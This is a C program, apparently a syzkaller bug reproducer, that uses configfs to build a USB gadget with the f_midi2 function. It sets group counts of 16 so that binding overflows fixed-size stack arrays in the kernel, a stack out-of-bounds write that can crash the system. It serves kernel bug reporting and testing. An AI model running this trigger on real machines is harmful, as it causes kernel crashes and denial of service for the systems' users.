// https://syzkaller.appspot.com/bug?id=017fcaefb318d50250802887137c879246165ccf
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/stat.h>
#include <errno.h>

static void write_file(const char *path, const char *val) {
    int fd = open(path, O_WRONLY);
    if (fd < 0) {
        printf("[-] Failed to open %s: %s\n", path, strerror(errno));
        exit(1);
    }
    if (write(fd, val, strlen(val)) < 0) {
        printf("[-] Failed to write to %s: %s\n", path, strerror(errno));
        exit(1);
    }
    close(fd);
    printf("[+] Wrote '%s' to %s\n", val, path);
}

static void create_dir(const char *path) {
    if (mkdir(path, 0777) < 0) {
        if (errno != EEXIST) {
            printf("[-] Failed to create directory %s: %s\n", path, strerror(errno));
            exit(1);
        }
    }
    printf("[+] Created directory %s\n", path);
}

static void create_symlink(const char *target, const char *linkpath) {
    if (symlink(target, linkpath) < 0) {
        if (errno != EEXIST) {
            printf("[-] Failed to create symlink %s -> %s: %s\n", linkpath, target, strerror(errno));
            exit(1);
        }
    }
    printf("[+] Created symlink %s -> %s\n", linkpath, target);
}

int main(void) {
    const char *gadget_dir = "/sys/kernel/config/usb_gadget/g_midi2_test";
    char path[512];
    
    printf("[*] Starting f_midi2 stack-out-of-bounds reproducer...\n");
    
    // Create the gadget
    create_dir(gadget_dir);
    
    snprintf(path, sizeof(path), "%s/idVendor", gadget_dir);
    write_file(path, "0x1234");
    
    snprintf(path, sizeof(path), "%s/idProduct", gadget_dir);
    write_file(path, "0x5678");
    
    snprintf(path, sizeof(path), "%s/strings/0x409", gadget_dir);
    create_dir(path);
    
    snprintf(path, sizeof(path), "%s/strings/0x409/serialnumber", gadget_dir);
    write_file(path, "123456");
    
    snprintf(path, sizeof(path), "%s/strings/0x409/manufacturer", gadget_dir);
    write_file(path, "Foo");
    
    snprintf(path, sizeof(path), "%s/strings/0x409/product", gadget_dir);
    write_file(path, "Bar");
    
    // Create the configuration
    snprintf(path, sizeof(path), "%s/configs/c.1", gadget_dir);
    create_dir(path);
    
    snprintf(path, sizeof(path), "%s/configs/c.1/strings/0x409", gadget_dir);
    create_dir(path);
    
    snprintf(path, sizeof(path), "%s/configs/c.1/strings/0x409/configuration", gadget_dir);
    write_file(path, "Config 1");
    
    // Create the f_midi2 function
    snprintf(path, sizeof(path), "%s/functions/midi2.0", gadget_dir);
    create_dir(path);
    
    // Trigger the vulnerability: Set num_groups and midi1_num_groups to 16
    // This will cause num_midi1_in and num_midi1_out to both be 16 (total 32),
    // overflowing the MAX_CABLES (16) sized arrays on the stack during bind.
    snprintf(path, sizeof(path), "%s/functions/midi2.0/ep.0/block.0/num_groups", gadget_dir);
    write_file(path, "16");
    
    snprintf(path, sizeof(path), "%s/functions/midi2.0/ep.0/block.0/midi1_num_groups", gadget_dir);
    write_file(path, "16");
    
    // Link the function to the configuration
    char target[512];
    snprintf(target, sizeof(target), "%s/functions/midi2.0", gadget_dir);
    snprintf(path, sizeof(path), "%s/configs/c.1/midi2.0", gadget_dir);
    create_symlink(target, path);
    
    // Bind the gadget to the first available UDC
    DIR *d = opendir("/sys/class/udc");
    if (d) {
        struct dirent *dir;
        int found = 0;
        while ((dir = readdir(d)) != NULL) {
            if (dir->d_name[0] != '.') {
                printf("[*] Found UDC: %s\n", dir->d_name);
                snprintf(path, sizeof(path), "%s/UDC", gadget_dir);
                write_file(path, dir->d_name);
                found = 1;
                break;
            }
        }
        closedir(d);
        if (!found) {
            printf("[-] No UDC found in /sys/class/udc\n");
            exit(1);
        }
    } else {
        printf("[-] Failed to open /sys/class/udc: %s\n", strerror(errno));
        exit(1);
    }
    
    printf("[+] Gadget bound successfully. If the kernel didn't crash, the bug might be fixed.\n");
    
    // Sleep a bit to allow asynchronous tasks to run
    sleep(1);
    
    return 0;
}
